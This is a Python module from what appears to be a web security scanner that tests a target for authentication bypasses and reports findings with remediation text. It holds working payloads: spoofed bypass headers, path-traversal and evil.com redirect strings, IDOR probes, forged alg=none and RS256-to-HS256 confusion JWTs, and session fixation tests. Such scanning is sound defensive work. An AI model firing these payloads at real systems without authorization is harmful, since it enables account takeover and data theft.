from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple
from ..http_layer import http_probe, Finding


AUTH_BYPASS_PATHS = [
    "/api/v1/users", "/api/users", "/api/v1/me",
    "/api/v1/admin/users", "/api/admin", "/api/v1/config",
    "/api/v1/secrets", "/api/v1/keys", "/api/v1/tokens",
    "/api/v1/internal", "/api/debug", "/api/status",
    "/api/health", "/.well-known/openid-configuration",
]

AUTH_HEADERS = [
    {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9."},
    {"Authorization": "Bearer null"},
    {"Authorization": "Bearer undefined"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},
    {"Referer": "https://localhost/admin"},
    {"X-Real-IP": "127.0.0.1"},
    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
    {"X-Api-Key": ""},
    {"X-Access-Token": ""},
    {"Cookie": "session=admin; role=admin"},
]

# ── JWT helpers (stdlib-only, no PyJWT dependency) ─────────────────────

def _b64url_encode(data: bytes) -> str:
    """Base64url-encode bytes (no padding)."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(s: str) -> bytes:
    """Base64url-decode with padding restoration."""
    padding = 4 - len(s) % 4
    if padding != 4:
        s += "=" * padding
    return base64.urlsafe_b64decode(s)


def _build_jwt(header: Dict[str, Any], payload: Dict[str, Any],
               secret: Optional[bytes] = None) -> str:
    """Build a JWT token. If secret is None, no signature (alg=none)."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    if secret is None:
        return f"{h}.{p}."
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def _try_decode_jwt_payload(token: str) -> Optional[Dict[str, Any]]:
    """Try to decode JWT payload without verification."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None
        return json.loads(_b64url_decode(parts[1]))
    except Exception:
        return None


def _try_decode_jwt_header(token: str) -> Optional[Dict[str, Any]]:
    """Try to decode JWT header without verification."""
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return None
        return json.loads(_b64url_decode(parts[0]))
    except Exception:
        return None


def _extract_bearer_token(resp: Dict[str, Any]) -> Optional[str]:
    """Extract a JWT Bearer token from response headers or body."""
    # Check WWW-Authenticate / Set-Cookie / response body for tokens
    headers = resp.get("headers", {})
    auth_header = headers.get("www-authenticate", "")
    if auth_header.startswith("Bearer "):
        return auth_header[7:].split(",")[0].strip()  # strip params
    # Check body for jwt patterns
    body = resp.get("body", "")
    import re
    patterns = [
        r'"token"\s*:\s*"(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)"',
        r'"access_token"\s*:\s*"(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)"',
        r'"id_token"\s*:\s*"(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)"',
    ]
    for pat in patterns:
        m = re.search(pat, body)
        if m:
            return m.group(1)
    return None


# ── Main entry point ─────────────────────────────────────────────────────

def run_auth(target: str, base_url: str, timeout: int = 8,
              verify_tls: bool = True) -> List[Finding]:
    """Comprehensive auth module. Covers 45+ techniques across 9 categories.

    Categories:
      1.  Header-based auth bypass (existing, expanded to all paths)
      2.  HTTP method tampering (expanded with CONNECT, TRACE, etc.)
      3.  Path traversal (expanded with 20+ encoding variants)
      4.  IDOR (expanded with UUID, base64, negative, float, boolean IDs)
      5.  JWT deep analysis (alg none, RS256→HS256 confusion, expired, aud, jwk/jku)
      6.  OAuth/OIDC misconfiguration
      7.  Session management deep
      8.  Rate limiting deep
      9.  HTTP method override headers
    """
    findings: List[Finding] = []
    host = target.replace("https://", "").replace("http://", "").split("/")[0]

    def add(title, severity, desc, evidence, pts=0,
            remediation: str = "Implement proper authentication middleware. Validate tokens server-side."):
        findings.append(Finding(
            title=title, severity=severity, category="auth_bypass",
            module="auth", description=desc, evidence=evidence,
            asset=host, points_deducted=pts, remediation=remediation,
        ))

    # ─── Technique 1-12: Header-based bypasses (ALL paths now) ──────────
    for path in AUTH_BYPASS_PATHS:
        url = base_url.rstrip("/") + path
        for i, headers in enumerate(AUTH_HEADERS):
            resp = http_probe(url, headers=headers, timeout=timeout, verify_tls=verify_tls)
            status = resp.get("status", 0)
            body = resp.get("body", "")[:2048].lower()

            if status == 200 and len(body) > 20:
                is_protected = any(kw in body for kw in [
                    "unauthorized", "forbidden", "401", "403", "login required"
                ])
                if not is_protected:
                    header_name = list(headers.keys())[0] if headers else "none"
                    add(
                        f"Auth bypass via {header_name} on {path}",
                        "critical" if "admin" in path.lower() or "secret" in path.lower() or "key" in path.lower() else "high",
                        f"Endpoint {path} accessible with suspicious {header_name} header",
                        f"{header_name} header bypassed auth -> 200 OK",
                        15 if ("admin" in path.lower() or "secret" in path.lower() or "key" in path.lower()) else 10,
                    )
                    break  # One bypass per endpoint is enough

    # ─── Technique 13: HTTP method tampering (EXPANDED) ─────────────────
    _method_tamper_paths = ["/api/v1/users", "/admin", "/api/v1/config",
                           "/api/v1/admin", "/api/v1/secrets"]
    _method_tamper_methods = ["OPTIONS", "PUT", "DELETE", "PATCH",
                              "CONNECT", "TRACE", "PROPFIND"]
    for path in _method_tamper_paths:
        url = base_url.rstrip("/") + path
        for method in _method_tamper_methods:
            resp = http_probe(url, method=method, timeout=timeout, verify_tls=verify_tls)
            status = resp.get("status", 0)
            body = resp.get("body", "")[:1024].lower()
            # TRACE method may echo back request headers — information leak
            if method == "TRACE" and status == 200:
                add(
                    f"TRACE method enabled: {path}",
                    "medium",
                    f"TRACE method is enabled on {path}, which can lead to XST (Cross-Site Tracing) attacks",
                    f"TRACE {path} -> 200",
                    5,
                    remediation="Disable TRACE HTTP method on all endpoints.",
                )
                break
            if status == 200 and len(body) > 20:
                is_protected = any(kw in body for kw in [
                    "unauthorized", "forbidden", "401", "403"
                ])
                if not is_protected:
                    add(
                        f"Method tampering: {method} {path}",
                        "high",
                        f"{method} method returns 200 on {path} — may bypass auth checks",
                        f"{method} {path} -> 200",
                        10,
                    )
                    break

    # ─── Technique 13b: Method override headers ─────────────────────────
    _override_headers = [
        {"X-HTTP-Method-Override": "DELETE"},
        {"X-Method-Override": "DELETE"},
        {"_method": "DELETE"},
        {"X-HTTP-Method-Override": "PUT"},
        {"X-Method-Override": "PUT"},
    ]
    for path in ["/api/v1/users/1", "/api/v1/admin/users/1", "/api/v1/config"]:
        url = base_url.rstrip("/") + path
        for oh in _override_headers:
            resp = http_probe(url, method="POST", headers=oh, timeout=timeout, verify_tls=verify_tls)
            status = resp.get("status", 0)
            body = resp.get("body", "")[:1024].lower()
            if status in (200, 204, 405):
                override_name = list(oh.keys())[0]
                add(
                    f"Method override accepted: {override_name} on {path}",
                    "medium",
                    f"Server honors {override_name}={oh[override_name]} header, "
                    f"allowing HTTP method bypass via POST",
                    f"POST {path} with {override_name} -> {status}",
                    5,
                    remediation="Do not trust client-supplied method override headers. "
                                "Use the actual HTTP method for routing."
                )
                break

    # ─── Technique 14: Path traversal (EXPANDED — 24 variants) ─────────
    traversal_paths = [
        # Original variants (kept)
        "/api/v1/../admin",
        "/api/..%2fadmin",
        "/static/..%2f..%2fadmin",
        "/%2e%2e/admin",
        # Double encoding
        "/..%252f..%252fadmin",
        "/api/%252e%252e/admin",
        "/%252e%252e/%252e%252e/admin",
        # UTF-8 overlong encoding
        "/%c0%ae%c0%ae/admin",
        "/%c0%ae%c0%ae/%c0%ae%c0%ae/admin",
        "/..%c0%afadmin",
        # Mixed case
        "/%2E%2e/admin",
        "/%2e%2E/admin",
        "/%2E%2E/admin",
        # NULL byte injection
        "/..%00/admin",
        "/api/..%00/admin",
        "/admin%00",
        "/api/v1/users%00.css",
        # Path truncation (Windows 8.3 shortname style)
        "/api/v1/users/ADMINI~1",
        "/api/v1/users/CONFIG~1",
        # UNC paths
        r"//evil.com/share",
        r"/../evil.com/share",
        # Extra slash variations
        "/api/v1/..//admin",
        "/api/v1/./../admin",
        "/..././..././admin",
        # URL-encoded slash
        "/api/v1/users%2f..%2f..%2fadmin",
    ]
    traversal_found = False
    for tp in traversal_paths:
        url = base_url.rstrip("/") + tp
        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
        if resp.get("status") == 200 and len(resp.get("body", "")) > 20:
            body_lower = resp.get("body", "")[:2048].lower()
            is_protected = any(kw in body_lower for kw in [
                "unauthorized", "forbidden", "401", "403", "not found", "error"
            ])
            if not is_protected:
                add(
                    f"Path traversal: {tp}",
                    "critical",
                    f"Path traversal bypassed access controls: {tp}",
                    f"GET {tp} -> 200",
                    15,
                    remediation="Normalize and canonicalize all request paths before routing. "
                                "Reject paths containing '..' sequences. Use allow-lists for file access."
                )
                traversal_found = True
                break
    # Report if no traversal found (info-level)
    if not traversal_found:
        add(
            "Path traversal: no bypass found (24 variants tested)",
            "info",
            "Tested 24 path traversal variants against admin/config endpoints. "
            "None returned unprotected 200 responses.",
            "24 traversal payloads -> all blocked or non-200",
            0,
            remediation="",
        )

    # ─── Technique 15: IDOR probe (EXPANDED) ───────────────────────────
    _idor_ids = [
        "1", "admin", "me", "0",           # original
        "00000000-0000-0000-0000-000000000001",  # UUID format
        "00000000-0000-0000-0000-000000000000",  # zero UUID
        "MQ==",                                # base64("1")
        "YWRtaW4=",                            # base64("admin")
        "-1", "-999",                          # negative IDs
        "1.0", "0.5",                          # float IDs
        "true", "false",                       # boolean IDs
        "999999", "2147483647",                # sequential range / int max
        "0x1", "0x0",                          # hex IDs
    ]
    _idor_paths = [
        "/api/v1/users/",
        "/api/users/",
        "/api/v1/accounts/",
        "/api/v1/profiles/",
        "/api/v1/orders/",
        "/api/v1/documents/",
    ]
    idor_found = False
    for id_val in _idor_ids:
        for path in _idor_paths:
            url = base_url.rstrip("/") + path + urllib.parse.quote(id_val, safe="")
            resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
            if resp.get("status") == 200:
                body = resp.get("body", "")[:2048]
                if any(kw in body.lower() for kw in [
                    "email", "password", "secret", "token", "key",
                    "ssn", "credit", "phone", "address", "dob",
                ]):
                    add(
                        f"Potential IDOR: {path}{id_val}",
                        "critical",
                        f"User data accessible without auth via IDOR: {path}{id_val}",
                        f"GET {path}{id_val} -> 200 (sensitive data in response)",
                        15,
                        remediation="Implement object-level authorization checks. "
                                    "Never rely on client-supplied IDs for access control. "
                                    "Use indirect references where possible."
                    )
                    idor_found = True
                    break
        if idor_found:
            break
    if not idor_found:
        add(
            "IDOR: no data exposure found (16 IDs x 6 endpoints)",
            "info",
            "Tested 16 ID patterns across 6 endpoint patterns. "
            "None returned sensitive data without authentication.",
            "96 IDOR probes -> all safe",
            0,
            remediation="",
        )

    # ─── Technique 16: JWT Deep Analysis ────────────────────────────────
    _jwt_endpoints = [
        "/api/v1/me", "/api/v1/users/me", "/api/me",
        "/api/v1/profile", "/api/v1/account",
    ]

    # 16a: Algorithm none bypass (improved — proper empty signature)
    _none_tokens = [
        # alg=none with empty signature
        _build_jwt({"alg": "none", "typ": "JWT"},
                   {"sub": "admin", "role": "admin", "iat": int(time.time())}),
        # alg=None (capitalized)
        _build_jwt({"alg": "None", "typ": "JWT"},
                   {"sub": "admin", "role": "admin", "iat": int(time.time())}),
        # alg=nOnE (mixed case)
        _build_jwt({"alg": "nOnE", "typ": "JWT"},
                   {"sub": "admin", "role": "admin", "iat": int(time.time())}),
        # alg=none with no trailing dot
        _b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
        + "."
        + _b64url_encode(json.dumps({"sub": "admin", "role": "admin"}, separators=(",", ":")).encode()),
    ]
    for token in _none_tokens:
        for ep in _jwt_endpoints:
            url = base_url.rstrip("/") + ep
            resp = http_probe(url, headers={"Authorization": f"Bearer {token}"},
                              timeout=timeout, verify_tls=verify_tls)
            status = resp.get("status", 0)
            body = resp.get("body", "")[:2048].lower()
            if status == 200 and not any(kw in body for kw in [
                "unauthorized", "forbidden", "401", "403", "invalid", "error"
            ]):
                add(
                    f"JWT alg=none bypass: {ep}",
                    "critical",
                    f"Server accepted JWT with algorithm 'none' (no signature) on {ep}. "
                    f"Attacker can forge arbitrary tokens.",
                    f"Bearer alg=none token -> 200 on {ep}",
                    20,
                    remediation="Explicitly reject JWTs with 'none' algorithm. "
                                "Maintain an allowlist of accepted algorithms (e.g., RS256, ES256). "
                                "Never use the JWT header 'alg' field to select verification method."
                )
                break
        else:
            continue
        break

    # 16b: RS256→HS256 key confusion
    # Fetch the JWKS or /.well-known/jwks.json to get the public key
    jwks_url = base_url.rstrip("/") + "/.well-known/jwks.json"
    jwks_resp = http_probe(jwks_url, timeout=timeout, verify_tls=verify_tls)
    # Also try common JWKS paths
    if jwks_resp.get("status") != 200:
        for alt_jwks in ["/jwks.json", "/api/v1/jwks", "/.well-known/openid-configuration"]:
            alt_url = base_url.rstrip("/") + alt_jwks
            alt_resp = http_probe(alt_url, timeout=timeout, verify_tls=verify_tls)
            if alt_resp.get("status") == 200:
                # If it's OIDC config, extract jwks_uri
                try:
                    oidc_cfg = json.loads(alt_resp.get("body", ""))
                    if "jwks_uri" in oidc_cfg:
                        jwks_uri = oidc_cfg["jwks_uri"]
                        if jwks_uri.startswith("http"):
                            jwks_resp = http_probe(jwks_uri, timeout=timeout, verify_tls=verify_tls)
                        else:
                            jwks_resp = http_probe(base_url.rstrip("/") + jwks_uri,
                                                   timeout=timeout, verify_tls=verify_tls)
                        break
                except (json.JSONDecodeError, KeyError):
                    pass

    # Extract public key components from JWKS and attempt HS256 confusion
    hs256_secret: Optional[bytes] = None
    if jwks_resp.get("status") == 200:
        try:
            jwks_data = json.loads(jwks_resp.get("body", ""))
            keys = jwks_data.get("keys", [])
            if keys:
                # Reconstruct PEM public key from JWK RSA components
                first_key = keys[0]
                if first_key.get("kty") == "RSA":
                    n_b64 = first_key.get("n", "")
                    e_b64 = first_key.get("e", "AQAB")
                    # Build a minimal PEM-formatted public key from n and e
                    # This is the exact byte sequence the server uses for RSA verification.
                    # If we can sign with HS256 using this key as secret, confusion works.
                    n_bytes = _b64url_decode(n_b64)
                    e_bytes = _b64url_decode(e_b64)
                    # Construct DER-encoded RSAPublicKey: SEQUENCE { INTEGER n, INTEGER e }
                    def _der_len(val_len: int) -> bytes:
                        if val_len < 128:
                            return bytes([val_len])
                        elif val_len < 256:
                            return bytes([0x81, val_len])
                        else:
                            return bytes([0x82, (val_len >> 8) & 0xff, val_len & 0xff])

                    def _der_integer(val: bytes) -> bytes:
                        # Prepend 0x00 if high bit set
                        if val[0] & 0x80:
                            val = b"\x00" + val
                        return b"\x02" + _der_len(len(val)) + val

                    n_der = _der_integer(n_bytes)
                    e_der = _der_integer(e_bytes)
                    seq_payload = n_der + e_der
                    der_bytes = b"\x30" + _der_len(len(seq_payload)) + seq_payload

                    # Wrap in SubjectPublicKeyInfo for PEM
                    oid_rsa = base64.b64decode(
                        "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A"
                    )  # SHA-256 with RSA
                    spki_payload = oid_rsa + der_bytes
                    spki_bytes = b"\x30" + _der_len(len(spki_payload)) + spki_payload

                    pem = "-----BEGIN PUBLIC KEY-----\n"
                    pem += base64.b64encode(spki_bytes).decode()
                    pem += "\n-----END PUBLIC KEY-----"
                    hs256_secret = pem.encode()
        except (json.JSONDecodeError, KeyError, Exception):
            pass

    if hs256_secret:
        confusion_token = _build_jwt(
            {"alg": "HS256", "typ": "JWT"},
            {"sub": "admin", "role": "admin", "iat": int(time.time())},
            secret=hs256_secret,
        )
        for ep in _jwt_endpoints:
            url = base_url.rstrip("/") + ep
            resp = http_probe(url, headers={"Authorization": f"Bearer {confusion_token}"},
                              timeout=timeout, verify_tls=verify_tls)
            status = resp.get("status", 0)
            body = resp.get("body", "")[:2048].lower()
            if status == 200 and not any(kw in body for kw in [
                "unauthorized", "forbidden", "401", "403", "invalid"
            ]):
                add(
                    f"JWT RS256→HS256 key confusion: {ep}",
                    "critical",
                    f"Server accepts HS256-signed token using RSA public key as HMAC secret. "
                    f"Complete authentication bypass via algorithm confusion.",
                    f"HS256 token signed with public key -> 200 on {ep}",
                    20,
                    remediation="Explicitly specify the expected algorithm when verifying JWTs. "
                                "Do not allow the 'alg' header to control verification. "
                                "Use separate keys for different algorithms."
                )
                break

    # 16c: Expired token acceptance
    _expired_token = _build_jwt(
        {"alg": "HS256", "typ": "JWT"},
        {"sub": "admin", "role": "admin", "exp": 946684800, "iat": 946684700},
        secret=b"reconpro-test-key",
    )
    for ep in _jwt_endpoints:
        url = base_url.rstrip("/") + ep
        resp = http_probe(url, headers={"Authorization": f"Bearer {_expired_token}"},
                          timeout=timeout, verify_tls=verify_tls)
        status = resp.get("status", 0)
        body = resp.get("body", "")[:2048].lower()
        if status == 200 and not any(kw in body for kw in [
            "unauthorized", "forbidden", "401", "403", "expired", "invalid"
        ]):
            add(
                f"JWT expired token accepted: {ep}",
                "high",
                f"Server accepted an expired JWT (exp=2000-01-01) on {ep}. "
                f"Token expiry is not being enforced.",
                f"Expired token (exp=946684800) -> 200 on {ep}",
                12,
                remediation="Always validate the 'exp' claim server-side. "
                            "Reject tokens where exp < current_time. "
                            "Use a small leeway window (< 30s)."
            )
            break

    # 16d: Audience mismatch
    _aud_mismatch_token = _build_jwt(
        {"alg": "HS256", "typ": "JWT"},
        {"sub": "admin", "role": "admin", "aud": "https://evil.com", "iat": int(time.time())},
        secret=b"reconpro-test-key",
    )
    for ep in _jwt_endpoints:
        url = base_url.rstrip("/") + ep
        resp = http_probe(url, headers={"Authorization": f"Bearer {_aud_mismatch_token}"},
                          timeout=timeout, verify_tls=verify_tls)
        status = resp.get("status", 0)
        body = resp.get("body", "")[:2048].lower()
        if status == 200 and not any(kw in body for kw in [
            "unauthorized", "forbidden", "401", "403", "invalid"
        ]):
            add(
                f"JWT audience mismatch accepted: {ep}",
                "high",
                f"Server accepted JWT with audience 'https://evil.com' on {ep}. "
                f"The 'aud' claim is not validated.",
                f"Token with aud=https://evil.com -> 200 on {ep}",
                12,
                remediation="Always validate the 'aud' (audience) claim matches the expected value. "
                            "Reject tokens with mismatched audiences."
            )
            break

    # 16e: jwk header injection
    _jwk_token = _build_jwt(
        {"alg": "HS256", "typ": "JWT",
         "jwk": {"kty": "oct", "k": _b64url_encode(b"reconpro-test-key"),
                 "alg": "HS256"}},
        {"sub": "admin", "role": "admin", "iat": int(time.time())},
        secret=b"reconpro-test-key",
    )
    for ep in _jwt_endpoints[:2]:
        url = base_url.rstrip("/") + ep
        resp = http_probe(url, headers={"Authorization": f"Bearer {_jwk_token}"},
                          timeout=timeout, verify_tls=verify_tls)
        status = resp.get("status", 0)
        body = resp.get("body", "")[:2048].lower()
        if status == 200 and not any(kw in body for kw in [
            "unauthorized", "forbidden", "401", "403", "invalid"
        ]):
            add(
                f"JWT jwk header injection: {ep}",
                "high",
                f"Server accepted JWT with embedded 'jwk' header. "
                f"The server may trust the key from the token header itself.",
                f"Token with embedded jwk -> 200 on {ep}",
                15,
                remediation="Never trust keys embedded in JWT headers. "
                            "Always use server-stored keys for verification. "
                            "Reject tokens containing 'jwk' or 'jku' headers."
            )
            break

    # 16f: jku header injection
    _jku_token = _build_jwt(
        {"alg": "RS256", "typ": "JWT",
         "jku": f"{base_url.rstrip('/')}/.well-known/jwks.json"},
        {"sub": "admin", "role": "admin", "iat": int(time.time())},
        secret=None,
    )
    for ep in _jwt_endpoints[:2]:
        url = base_url.rstrip("/") + ep
        resp = http_probe(url, headers={"Authorization": f"Bearer {_jku_token}"},
                          timeout=timeout, verify_tls=verify_tls)
        status = resp.get("status", 0)
        body = resp.get("body", "")[:2048].lower()
        if status == 200 and not any(kw in body for kw in [
            "unauthorized", "forbidden", "401", "403", "invalid"
        ]):
            add(
                f"JWT jku header injection: {ep}",
                "high",
                f"Server accepted JWT with 'jku' header pointing to attacker-controlled URL. "
                f"This allows key injection attacks.",
                f"Token with jku header -> 200 on {ep}",
                15,
                remediation="Never trust 'jku' headers in JWT. Always use a pre-configured key set URL. "
                            "Reject tokens containing 'jku' or 'x5u' headers pointing to external URLs."
            )
            break

    # ─── Technique 17: OAuth/OIDC Misconfiguration ──────────────────────

    # 17a: Open redirect via OAuth callback
    _oauth_redirect_payloads = [
        "/oauth/callback?redirect_uri=https://evil.com",
        "/oauth/callback?redirect_uri=https://evil.com&state=x",
        "/oauth/callback?redirect_uri=\\\\evil.com",
        "/oauth/callback?next=https://evil.com",
        "/oauth/callback?continue=https://evil.com",
        "/oauth/callback?return_to=https://evil.com",
        "/oauth/callback?redirect=https://evil.com",
        "/authorize?redirect_uri=https://evil.com",
        "/auth/callback?redirect_uri=https://evil.com",
        "/login/oauth/callback?redirect_uri=https://evil.com",
    ]
    for payload in _oauth_redirect_payloads:
        url = base_url.rstrip("/") + payload
        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls, method="GET")
        status = resp.get("status", 0)
        # Check for 3xx redirect or Location header with evil.com
        location = resp.get("headers", {}).get("location", "")
        body = resp.get("body", "")[:4096]
        if status in (301, 302, 303, 307, 308) and "evil.com" in location:
            add(
                f"OAuth open redirect: {payload.split('?')[0]}",
                "high",
                f"OAuth callback accepts external redirect_uri parameter. "
                f"Redirect to https://evil.com was allowed.",
                f"GET {payload} -> {status} Location: {location}",
                12,
                remediation="Validate redirect_uri against a strict allowlist of domains. "
                            "Never allow open-ended redirect URIs in OAuth flows."
            )
            break
        # Also check for redirect in response body (meta refresh, JS redirect)
        if "evil.com" in body.lower():
            add(
                f"OAuth redirect_uri reflected in response: {payload.split('?')[0]}",
                "medium",
                f"OAuth callback reflected user-supplied redirect_uri in response body. "
                f"Potential for open redirect or phishing.",
                f"GET {payload} -> evil.com reflected in body",
                8,
                remediation="Do not reflect user-supplied redirect_uri in response body. "
                            "Validate against allowlist."
            )
            break

    # 17b: Token leakage in URL fragments
    _token_leak_paths = [
        "/oauth/callback#access_token=fake_token",
        "/auth/callback#id_token=eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
        "/oauth/callback#token_type=bearer&access_token=leaked",
    ]
    for tl_path in _token_leak_paths:
        url = base_url.rstrip("/") + tl_path
        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
        body = resp.get("body", "")[:4096]
        # Check if the token fragment is referenced in response (e.g., in JS that reads hash)
        if "access_token" in body or "id_token" in body:
            if "window.location.hash" in body or "location.hash" in body:
                add(
                    "OAuth token in URL fragment with client-side extraction",
                    "medium",
                    "Application may expose access tokens via URL fragments. "
                    "Tokens in fragments can leak via Referer header.",
                    f"Fragment token pattern found in response JS",
                    8,
                    remediation="Use Authorization Code flow with PKCE instead of Implicit flow. "
                                "Tokens should be delivered via secure HTTP headers, not URL fragments."
                )
                break

    # 17c: Missing PKCE (detect implicit flow support)
    _pkce_paths = [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
    ]
    for pkce_path in _pkce_paths:
        url = base_url.rstrip("/") + pkce_path
        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
        if resp.get("status") == 200:
            try:
                oidc_cfg = json.loads(resp.get("body", ""))
                # Check if implicit flow (response_type=token) is supported
                grant_types = oidc_cfg.get("grant_types_supported", [])
                response_types = oidc_cfg.get("response_types_supported", [])
                code_challenge_methods = oidc_cfg.get("code_challenge_methods_supported", [])

                if "token" in response_types or "id_token" in response_types:
                    if not code_challenge_methods:
                        add(
                            "OIDC: Implicit flow supported without PKCE",
                            "medium",
                            f"OpenID configuration at {pkce_path} supports implicit flow "
                            f"(response_type=token) but does not list code_challenge_methods. "
                            f"Authorization Code flow without PKCE is vulnerable to code interception.",
                            f"response_types_supported={response_types}, code_challenge_methods_supported={code_challenge_methods}",
                            8,
                            remediation="Disable implicit flow. Require Authorization Code flow with PKCE "
                                        "(S256 code challenge method) for all public clients."
                        )
                elif "authorization_code" in grant_types and not code_challenge_methods:
                    add(
                        "OIDC: Authorization Code flow without PKCE",
                        "medium",
                        f"OIDC configuration supports authorization_code grant but does not "
                        f"require PKCE (no code_challenge_methods_supported).",
                        f"grant_types={grant_types}, code_challenge_methods={code_challenge_methods}",
                        6,
                        remediation="Require PKCE (S256) for all Authorization Code flows, "
                                    "especially for public clients (SPAs, mobile apps)."
                    )
            except (json.JSONDecodeError, KeyError):
                pass

    # 17d: Wildcard redirect URIs
    _wildcard_tests = [
        ("/oauth/authorize?redirect_uri=https://evil.com", "https://evil.com"),
        ("/oauth/authorize?redirect_uri=https://evil.evil.com", "evil.evil.com"),
        ("/oauth/authorize?redirect_uri=https://evil.com.benign.com", "evil.com.benign.com"),
    ]
    for w_path, w_domain in _wildcard_tests:
        url = base_url.rstrip("/") + w_path
        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
        status = resp.get("status", 0)
        location = resp.get("headers", {}).get("location", "")
        if status in (301, 302, 303, 307, 308) and w_domain in location:
            add(
                f"OAuth wildcard redirect URI: {w_domain}",
                "high",
                f"OAuth authorize endpoint redirects to {w_domain}. "
                f"Redirect URI validation may use insecure wildcards.",
                f"GET {w_path} -> {status} Location: {location}",
                12,
                remediation="Use exact-match redirect URI validation. "
                            "Never use wildcard, substring, or domain-suffix matching."
            )
            break

    # ─── Technique 18: Session Management Deep ──────────────────────────

    # 18a: Session fixation — set cookie before login, check if it persists
    _fixation_cookie = "reconpro_fixation_test=a1b2c3d4e5f6"
    _login_paths = ["/login", "/auth/login", "/api/v1/auth/login", "/api/v1/login"]
    for lp in _login_paths:
        url = base_url.rstrip("/") + lp
        # First request: send a pre-set session cookie
        resp1 = http_probe(url, method="POST",
                            headers={"Cookie": _fixation_cookie,
                                     "Content-Type": "application/json"},
                            body=json.dumps({"username": "test", "password": "test"}).encode(),
                            timeout=timeout, verify_tls=verify_tls)
        set_cookie1 = resp1.get("headers", {}).get("set-cookie", "")
        # If the server set-cookie contains our injected cookie name, fixation likely
        if "reconpro_fixation_test" in set_cookie1.lower():
            add(
                f"Session fixation: {lp}",
                "high",
                f"Login endpoint at {lp} accepted and may persist client-supplied session cookie. "
                f"Session fixation attack may be possible.",
                f"POST {lp} with pre-set cookie -> Set-Cookie contains injected value",
                12,
                remediation="Always generate a new session ID after successful authentication. "
                            "Invalidate the old session. Do not accept session IDs from untrusted sources."
            )
            break
        # Also check: if response sets NO new cookie and returns 200, fixation possible
        if resp1.get("status") == 200 and not set_cookie1:
            body = resp1.get("body", "").lower()
            if "login successful" in body or "authenticated" in body or "token" in body:
                add(
                    f"Session fixation (no rotation): {lp}",
                    "medium",
                    f"Login at {lp} returned success but did not set a new session cookie. "
                    f"Pre-authentication session may persist post-login.",
                    f"POST {lp} -> 200, no Set-Cookie header",
                    8,
                    remediation="Always issue a new session ID upon successful authentication. "
                                "Regenerate session state server-side."
                )
                break

    # 18b: Session ID in URL
    _session_url_patterns = [
        "/dashboard;jsessionid=RECONPRO_TEST",
        "/api/v1/users;ASPSESSIONID=RECONPRO",
        "/profile?PHPSESSID=RECONPRO_TEST",
        "/home?session_id=RECONPRO_TEST",
    ]
    for sup in _session_url_patterns:
        url = base_url.rstrip("/") + sup
        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
        status = resp.get("status", 0)
        body = resp.get("body", "")[:2048]
        if status == 200 and len(body) > 20:
            body_lower = body.lower()
            is_protected = any(kw in body_lower for kw in [
                "unauthorized", "forbidden", "401", "403"
            ])
            if not is_protected and ("jsessionid" in body_lower or "aspsessionid" in body_lower
                                     or "phpsessid" in body_lower):
                add(
                    "Session ID in URL",
                    "medium",
                    "Session ID appears to be accepted or reflected in URL. "
                    "URL-based session IDs can leak via Referer header, browser history, and server logs.",
                    f"GET {sup} -> 200, session ID in response",
                    8,
                    remediation="Store session IDs exclusively in HttpOnly, Secure cookies. "
                                "Never accept or generate session IDs in URLs."
                )
                break

    # 18c: Insecure session token generation (sequential/predictable)
    # Make two requests and compare Set-Cookie session values
    _session_probe_path = "/api/v1/session" if True else "/session"
    _session_cookies: List[str] = []
    for _ in range(3):
        url = base_url.rstrip("/") + "/"
        resp = http_probe(url, timeout=timeout, verify_tls=verify_tls)
        set_cookie = resp.get("headers", {}).get("set-cookie", "")
        if set_cookie:
            # Extract session cookie value
            import re
            m = re.search(r'(?:session|sid|jsessionid|phpsessid|aspsessionid)\s*=\s*([^;]+)',
                         set_cookie, re.IGNORECASE)
            if m:
                _session_cookies.append(m.group(1).strip())
    if len(_session_cookies) >= 2:
        # Check if cookies are identical (no rotation) or very similar (sequential)
        if len(set(_session_cookies)) == 1:
            add(
                "Session token not randomized between requests",
                "medium",
                f"Multiple requests returned identical session cookie: {_session_cookies[0][:20]}... "
                f"Session tokens should be unique per session.",
                f"3 requests -> same session cookie",
                8,
                remediation="Generate cryptographically random session tokens (at least 128 bits). "
                            "Ensure uniqueness across all active sessions."
            )
        # Check for short/weak session tokens
        for sc in _session_cookies:
            if len(sc) < 16:
                add(
                    "Weak session token length",
                    "medium",
                    f"Session token is only {len(sc)} characters long: {sc[:20]}... "
                    f"Minimum recommended length is 128 bits (16+ chars of hex/base64).",
                    f"Session cookie length={len(sc)}",
                    6,
                    remediation="Use session tokens of at least 128 bits. "
                                "Use secrets.token_urlsafe() or equivalent CSPRNG."
                )
                break

